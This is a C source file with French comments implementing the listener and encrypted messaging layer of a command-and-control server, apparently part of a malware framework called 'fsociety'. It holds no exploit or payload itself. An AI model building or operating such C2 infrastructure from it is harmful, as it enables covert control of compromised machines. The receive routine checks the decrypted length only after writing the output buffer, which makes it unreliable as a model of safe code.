#include "server.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <fcntl.h>
#include "crypto_common.h"
#include "protocol.h"

/* ============================================================
 * fsociety — Implémentation du serveur C2
 * ============================================================ */

/* ---------- Cycle de vie ---------- */

int fso_server_init(fso_server_t *srv, uint16_t port)
{
    if (!srv) return -1;

    memset(srv, 0, sizeof(*srv));
    srv->listen_fd = -1;
    srv->port = port;

    /* Création du socket TCP. */
    srv->listen_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (srv->listen_fd < 0) {
        perror("[server] socket");
        return -1;
    }

    /* Réutilisation d'adresse (évite "Address already in use"). */
    int opt = 1;
    if (setsockopt(srv->listen_fd, SOL_SOCKET, SO_REUSEADDR,
                   &opt, sizeof(opt)) < 0) {
        perror("[server] setsockopt");
        close(srv->listen_fd);
        srv->listen_fd = -1;
        return -1;
    }

    /* Bind sur toutes les interfaces, port donné. */
    srv->addr.sin_family = AF_INET;
    srv->addr.sin_addr.s_addr = htonl(INADDR_ANY);
    srv->addr.sin_port = htons(port);

    if (bind(srv->listen_fd, (struct sockaddr *)&srv->addr,
             sizeof(srv->addr)) < 0) {
        perror("[server] bind");
        close(srv->listen_fd);
        srv->listen_fd = -1;
        return -1;
    }

    /* Listen. */
    if (listen(srv->listen_fd, FSO_BACKLOG) < 0) {
        perror("[server] listen");
        close(srv->listen_fd);
        srv->listen_fd = -1;
        return -1;
    }

    printf("[+] C2 en écoute sur 0.0.0.0:%u\n", port);
    return 0;
}

int fso_server_accept(fso_server_t *srv)
{
    if (!srv || srv->listen_fd < 0) return -1;

    struct sockaddr_in cli_addr;
    socklen_t cli_len = sizeof(cli_addr);

    int fd = accept(srv->listen_fd,
                    (struct sockaddr *)&cli_addr, &cli_len);
    if (fd < 0) {
        perror("[server] accept");
        return -1;
    }

    /* Cherche un slot libre. */
    int idx = -1;
    for (int i = 0; i < FSO_MAX_CLIENTS; i++) {
        if (!srv->clients[i].active) {
            idx = i;
            break;
        }
    }

    if (idx < 0) {
        fprintf(stderr, "[-] Trop de clients, connexion refusée\n");
        close(fd);
        return -1;
    }

    srv->clients[idx].fd = fd;
    srv->clients[idx].ip = cli_addr.sin_addr.s_addr;
    srv->clients[idx].port = ntohs(cli_addr.sin_port);
    srv->clients[idx].active = 1;
    srv->nclients++;

    printf("[+] Client #%d connecté : %s:%u\n",
           idx,
           inet_ntoa(cli_addr.sin_addr),
           ntohs(cli_addr.sin_port));

    return idx;
}

int fso_server_disconnect(fso_server_t *srv, int idx)
{
    if (!srv || idx < 0 || idx >= FSO_MAX_CLIENTS) return -1;
    if (!srv->clients[idx].active) return -1;

    close(srv->clients[idx].fd);
    srv->clients[idx].fd = -1;
    srv->clients[idx].active = 0;
    srv->nclients--;

    printf("[-] Client #%d déconnecté\n", idx);
    return 0;
}

void fso_server_close(fso_server_t *srv)
{
    if (!srv) return;

    for (int i = 0; i < FSO_MAX_CLIENTS; i++) {
        if (srv->clients[i].active) {
            close(srv->clients[i].fd);
            srv->clients[i].active = 0;
        }
    }

    if (srv->listen_fd >= 0) {
        close(srv->listen_fd);
        srv->listen_fd = -1;
    }

    srv->nclients = 0;
    printf("[+] C2 fermé\n");
}

/* ---------- I/O bas niveau ---------- */

ssize_t fso_server_send(fso_server_t *srv, int idx,
                        const void *buf, size_t len)
{
    if (!srv || idx < 0 || idx >= FSO_MAX_CLIENTS) return -1;
    if (!srv->clients[idx].active) return -1;

    ssize_t total = 0;
    const uint8_t *p = buf;

    while (total < (ssize_t)len) {
        ssize_t n = send(srv->clients[idx].fd,
                         p + total, len - (size_t)total, 0);
        if (n <= 0) {
            if (n < 0 && errno == EINTR) continue;
            return -1;
        }
        total += n;
    }

    return total;
}

ssize_t fso_server_recv(fso_server_t *srv, int idx,
                        void *buf, size_t len)
{
    if (!srv || idx < 0 || idx >= FSO_MAX_CLIENTS) return -1;
    if (!srv->clients[idx].active) return -1;

    ssize_t n;
    do {
        n = recv(srv->clients[idx].fd, buf, len, 0);
    } while (n < 0 && errno == EINTR);

    if (n == 0) {
        /* Déconnexion propre. */
        return 0;
    }
    if (n < 0) {
        return -1;
    }

    return n;
}

/* ---------- Réception EXACTE (garantit len octets ou échec) ---------- */

ssize_t fso_server_recv_exact(fso_server_t *srv, int idx,
                              void *buf, size_t len)
{
    if (!srv || idx < 0 || idx >= FSO_MAX_CLIENTS) return -1;
    if (!srv->clients[idx].active) return -1;

    uint8_t *p = (uint8_t *)buf;
    size_t got = 0;
    while (got < len) {
        ssize_t n = fso_server_recv(srv, idx, p + got, len - got);
        if (n <= 0) return -1;
        got += (size_t)n;
    }
    return (ssize_t)got;
}

/* ---------- Utilitaires ---------- */

const char *fso_server_client_ip(const fso_server_t *srv, int idx)
{
    if (!srv || idx < 0 || idx >= FSO_MAX_CLIENTS) return "?";
    if (!srv->clients[idx].active) return "?";

    struct in_addr a;
    a.s_addr = srv->clients[idx].ip;
    return inet_ntoa(a);
}

/* ============================================================
 * I/O chiffré (AES-256-GCM)
 * ============================================================ */

int fso_server_send_secure(fso_server_t *srv, int idx,
                           uint8_t type, uint16_t seq_id,
                           const uint8_t *payload, uint32_t payload_len)
{
    if (!srv || idx < 0 || idx >= FSO_MAX_CLIENTS) return -1;
    if (!srv->clients[idx].active) return -1;
    if (!srv->clients[idx].has_key) return -1;

    /* Chiffrer le payload. */
    uint8_t encrypted[FSO_MAX_PAYLOAD + 64];
    size_t enc_len = 0;

    if (fso_aes_encrypt(srv->clients[idx].aes_key,
                        payload, payload_len,
                        encrypted, &enc_len) != FSO_CRYPTO_OK) {
        fprintf(stderr, "[-] Chiffrement AES échoué\n");
        return -1;
    }

    /* Pack le paquet avec le payload chiffré. */
    uint8_t packet[FSO_MAX_PAYLOAD + 128];
    int packet_len = fso_pack(type, seq_id,
                              encrypted, (uint32_t)enc_len,
                              packet, sizeof(packet));
    if (packet_len < 0) {
        fprintf(stderr, "[-] fso_pack échoué\n");
        return -1;
    }

    /* Envoi. */
    if (fso_server_send(srv, idx, packet, (size_t)packet_len) < 0) {
        fprintf(stderr, "[-] Envoi échoué\n");
        return -1;
    }

    return 0;
}

int fso_server_recv_secure(fso_server_t *srv, int idx,
                           fso_header_t *header_out,
                           uint8_t *payload_out, size_t payload_size)
{
    if (!srv || idx < 0 || idx >= FSO_MAX_CLIENTS) return -1;
    if (!srv->clients[idx].active) return -1;
    if (!srv->clients[idx].has_key) return -1;

    /* ---------- 1. Lire EXACTEMENT les 11 octets d'en-tête ---------- */
    uint8_t hdr_buf[FSO_HEADER_SIZE];
    if (fso_server_recv_exact(srv, idx, hdr_buf, FSO_HEADER_SIZE)
            != (ssize_t)FSO_HEADER_SIZE) {
        fprintf(stderr, "[-] Lecture en-tête échouée\n");
        return -1;
    }

    /* ---------- 2. Parser l'en-tête ---------- */
    fso_header_t header;
    const uint8_t *dummy;
    if (fso_unpack(hdr_buf, FSO_HEADER_SIZE, &header, &dummy) != 0) {
        fprintf(stderr, "[-] fso_unpack (header) échoué\n");
        return -1;
    }
    if (header.length > FSO_MAX_PAYLOAD) {
        fprintf(stderr, "[-] Payload annoncé trop grand : %u\n", header.length);
        return -1;
    }

    /* ---------- 3. Lire EXACTEMENT header.length octets ---------- */
    uint8_t *encrypted = malloc(header.length);
    if (!encrypted) return -1;

    if (fso_server_recv_exact(srv, idx, encrypted, header.length)
            != (ssize_t)header.length) {
        fprintf(stderr, "[-] Lecture payload échouée\n");
        free(encrypted);
        return -1;
    }

    /* ---------- 4. Déchiffrer ---------- */
    size_t dec_len = 0;
    if (fso_aes_decrypt(srv->clients[idx].aes_key,
                        encrypted, header.length,
                        payload_out, &dec_len) != FSO_CRYPTO_OK) {
        fprintf(stderr, "[-] Déchiffrement AES échoué\n");
        free(encrypted);
        return -1;
    }
    free(encrypted);

    if (dec_len > payload_size) {
        fprintf(stderr, "[-] Payload déchiffré trop grand\n");
        return -1;
    }

    if (header_out) {
        *header_out = header;
        header_out->length = (uint32_t)dec_len;
    }

    return (int)dec_len;
}